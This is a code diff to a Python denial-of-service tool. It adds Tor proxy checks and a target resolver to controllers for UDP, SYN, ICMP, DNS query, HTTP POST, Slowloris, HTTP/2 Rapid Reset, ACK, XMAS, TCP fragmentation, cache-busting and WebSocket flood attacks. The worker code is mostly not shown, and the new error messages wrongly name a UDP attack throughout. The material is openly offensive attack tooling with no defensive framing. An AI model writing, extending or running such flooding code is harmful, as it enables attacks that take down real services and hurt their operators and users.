@@ -17,6 +17,7 @@ import netifaces  # NEW: Import the netifaces library
 from queue import Queue  # NEW: Import Queue for thread-safe job management
 import asyncio  # NEW: Import for asynchronous operations
 import websockets # NEW: Import the websockets library
+import ipaddress
 
 
 # ==============================================================================
@@ -39,102 +40,99 @@ ports_lock = threading.Lock()
 
 
 # --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
-# --- NEW: TOR CONNECTION CHECKER ---
+# --- NEW: More Robust Tor Connection Checker ---
 def check_tor_connection():
     """
-    Attempts to connect to a known onion service to verify Tor is working.
-    check.torproject.org has a special endpoint for this on port 80.
+    Attempts to connect to a list of highly reliable targets through Tor to
+    verify that a working circuit can be established.
 
-    :return: True if the connection succeeds, False otherwise.
+    :return: True if a connection to ANY target succeeds, False otherwise.
     """
-    print("[INFO] Testing Tor connection... ", end="", flush=True)
-    is_working = False
-    s = None
-    try:
-        s = socks.socksocket()
-        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-        s.settimeout(15)  # Give Tor some time to build a circuit
+    print("[INFO] Testing Tor connection... This may take up to a minute.")
 
-        # We connect to the IP of 'check.torproject.org'
-        # Using the raw IP avoids a DNS leak.
-        s.connect(("199.254.238.130", 80))
-        is_working = True
-        print("Success!")
-    except socks.ProxyError as e:
-        print(f"Failed. Proxy Error: {e}")
-    except Exception as e:
-        print(f"Failed. General Error: {e}")
-    finally:
-        if s:
-            s.close()
-    return is_working
+    # A list of reliable IPs (Google, Cloudflare, Quad9 DNS) and a common port.
+    # We use IPs to avoid potential DNS-over-Tor issues during the check itself.
+    test_targets = [
+        ("8.8.8.8", 53),  # Google DNS
+        ("1.1.1.1", 53),  # Cloudflare DNS
+        ("9.9.9.9", 53),  # Quad9 DNS
+        ("172.217.16.196", 80)  # One of Google's web server IPs
+    ]
 
-
-# A thread-safe list to store the results of the scan
-def port_scan_worker(target_ip, port_queue):
-    """Worker that takes port numbers from a queue and checks if they are open."""
-    while not port_queue.empty():
+    # Try each target in the list
+    for target_ip, port in test_targets:
+        s = None
+        print(f"  [+] Trying target: {target_ip}:{port}... ", end="", flush=True)
         try:
-            port = port_queue.get()
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(0.5)  # Use a short timeout for speed
-                # If the connection succeeds, the port is open
-                if s.connect_ex((target_ip, port)) == 0:
-                    with ports_lock:
-                        open_ports.append(port)
-            port_queue.task_done()
-        except Exception:
-            # Silently handle any errors
-            port_queue.task_done()
-            continue
+            s = socks.socksocket()
+            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            s.settimeout(20)  # 20 second timeout per target
+
+            s.connect((target_ip, port))
+
+            # If we reach here, the connection was successful!
+            print("Success!")
+            if s: s.close()
+            return True  # Exit the function immediately with a success result
+
+        except socks.ProxyError as e:
+            # This indicates a problem with the local proxy itself
+            print(f"Failed. Proxy Error: {e}")
+            print("[HINT] The Tor service might be down or misconfigured.")
+            # If the proxy itself fails, no point in trying other targets
+            if s: s.close()
+            return False
+
+        except (socket.timeout, ConnectionRefusedError, OSError) as e:
+            # This means the proxy is working, but the connection *through* it failed.
+            # This is normal if a single Tor circuit is bad. We'll just try the next target.
+            print(f"Failed (Timeout/Refused). Reason: {type(e).__name__}")
+            if s: s.close()
+            continue  # Move to the next target in the list
+
+    # If the loop finishes without a single successful connection
+    print("\n[ERROR] All connection attempts through Tor failed.")
+    print("[HINT] Your Tor service is running but may be unable to establish a stable circuit.")
+    print("[HINT] Check for restrictive firewalls, or try restarting the Tor service to get a new circuit.")
+    return False
 
 
-def run_port_scan(target_url, ports_to_scan, threads=100):
+def is_valid_ip(address):
+    """Checks if a given string is a valid IPv4 or IPv6 address."""
+    try:
+        ipaddress.ip_address(address)
+        return True
+    except ValueError:
+        return False
+
+
+def get_target_ips(target_string):
     """
-    Manages a multi-threaded TCP port scan to find open ports.
+    Intelligently determines if the target is an IP or a domain name.
 
-    :param target_url: The domain name of the target.
-    :param ports_to_scan: A list or range of ports to check.
-    :param threads: Number of concurrent scanning threads.
-    :return: A sorted list of open ports.
+    :param target_string: The user's input (can be "example.com" or "1.2.3.4").
+    :return: A list of target IP addresses.
     """
-    ips = resolve_to_ipv4(target_url)
-    if not ips:
-        print(f"[RECON] Could not resolve {target_url}. Aborting scan.")
-        return []
-
-    target_ip = ips[0]
-    print(f"[RECON] Starting TCP port scan on {target_ip}...")
-
-    # Clear previous results and set up the job queue
-    global open_ports
-    open_ports = []
-    port_queue = Queue()
-    for port in ports_to_scan:
-        port_queue.put(port)
-
-    # Start the worker threads
-    for _ in range(threads):
-        t = threading.Thread(target=port_scan_worker, args=(target_ip, port_queue))
-        t.daemon = True
-        t.start()
-
-    # Wait for all jobs in the queue to be completed
-    port_queue.join()
-
-    print(f"[RECON] Scan complete. Found {len(open_ports)} open TCP ports.")
-    return sorted(open_ports)
+    if is_valid_ip(target_string):
+        # The user provided an IP address directly.
+        print(f"[INFO] Target '{target_string}' is a valid IP. Using it directly.")
+        return [target_string]
+    else:
+        # The user provided a domain name. Resolve it.
+        print(f"[INFO] Target '{target_string}' is a domain name. Resolving...")
+        return resolve_to_ipv4(target_string)
 
 
 def resolve_to_ipv4(target_url):
     """Resolves a hostname to a list of its IPv4 addresses."""
     try:
-        # getaddrinfo is the modern and correct way to resolve hosts
         addr_info = socket.getaddrinfo(target_url, None, family=socket.AF_INET)
-        # Use a set to automatically handle duplicate IPs
         ips = {item[4][0] for item in addr_info}
-        return sorted(list(ips))
+        resolved_ips = sorted(list(ips))
+        print(f"  [+] Resolved '{target_url}' to: {resolved_ips}")
+        return resolved_ips
     except socket.gaierror:
+        print(f"  [!] DNS resolution failed for '{target_url}'.")
         return []
 
 
@@ -226,8 +224,9 @@ def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
 
 def attack_udp(method, target_url, port, duration, stop_event, pause_event, threads=150):
     """Controller for UDP flood attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -270,8 +269,9 @@ def syn_worker(stop_event, pause_event, target_ip, port, iface):
 
 def synflood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for SYN flood attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -320,8 +320,9 @@ def dns_query_worker(stop_event, pause_event, target_ip, target_domain, iface):
 # --- NEW: DNS Query Flood Controller ---
 def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for DNS Query Flood attacks."""
-    ips = resolve_to_ipv4(target_domain)
+    ips = get_target_ips(target_domain)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_domain}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -351,8 +352,9 @@ def icmp_worker(stop_event, pause_event, target_ip, iface):
 
 def icmpflood(target_url, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for ICMP flood attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -444,8 +446,9 @@ def slowloris_worker(stop_event, pause_event, target_ip, port, host_header, use_
 
 def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
     """Controller for HTTP POST flood attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -462,8 +465,9 @@ def attack_http_post(target_url, port, duration, stop_event, pause_event, thread
 
 def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200, use_proxy=False):
     """Controller for Slowloris attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -543,8 +547,9 @@ def h2_rapid_reset_worker(stop_event, pause_event, target_ip, port, host_header)
 def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, threads=50):
     """Controller for HTTP/2 Rapid Reset attacks."""
     # Note: This attack is so efficient that fewer threads are needed compared to other floods.
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -611,8 +616,9 @@ def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port, iface):
 # --- NEW: TCP Fragmentation Attack Controller ---
 def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for TCP Fragmentation attacks."""
-    ips = resolve_to_ipv4(target_url)
+    ips = get_target_ips(target_url)
     if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
         return
 
     attack_end_time = time.time() + duration
@@ -678,8 +684,10 @@ def http_cache_bust_worker(stop_event, pause_event, target_ip, port, host_header
 # --- NEW: Cache-Busting GET Flood Controller ---
 def attack_http_cache_bust(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
     """Controller for Cache-Busting HTTP GET flood attacks."""
-    ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    ips = get_target_ips(target_url)
+    if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -720,8 +728,10 @@ def ack_worker(stop_event, pause_event, target_ip, port, iface):
 
 def attack_ack_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for TCP ACK flood attacks."""
-    ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    ips = get_target_ips(target_url)
+    if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -760,8 +770,10 @@ def xmas_worker(stop_event, pause_event, target_ip, port, iface):
 
 def attack_xmas_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
     """Controller for TCP XMAS flood attacks."""
-    ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    ips = get_target_ips(target_url)
+    if not ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -818,13 +830,26 @@ def websocket_worker_sync_wrapper(stop_event, pause_event, target_uri, use_proxy
 
 def attack_websocket_flood(target_domain, path, port, duration, stop_event, pause_event, sockets=100, use_proxy=False):
     """Controller for WebSocket flood attacks."""
+    # Use our intelligent function to get the IP(s) to connect to.
+    target_ips = get_target_ips(target_domain)
+
+    if not target_ips:
+        print(f"[ERROR] Could not get a valid IP for target '{target_domain}'. Aborting WebSocket attack.")
+        return
+
     # Determine the scheme (ws or wss for secure)
     scheme = "wss" if port == 443 else "ws"
+
+    # The URI will always use the original `target_domain` string for the host part.
+    # This is crucial for things like SNI (Server Name Indication) in TLS and
+    # for web servers that host multiple sites (virtual hosts).
     target_uri = f"{scheme}://{target_domain}:{port}{path}"
 
-    print(f"[INFO] Targeting WebSocket endpoint: {target_uri}")
+    print(f"[INFO] Targeting WebSocket endpoint URI: {target_uri}")
+    print(f"[INFO] Will connect to underlying IP(s): {target_ips}")
 
     attack_end_time = time.time() + duration
+    # Launch all sockets. They will all resolve the domain in the target_uri.
     for _ in range(sockets):
         t = threading.Thread(
             target=websocket_worker_sync_wrapper,
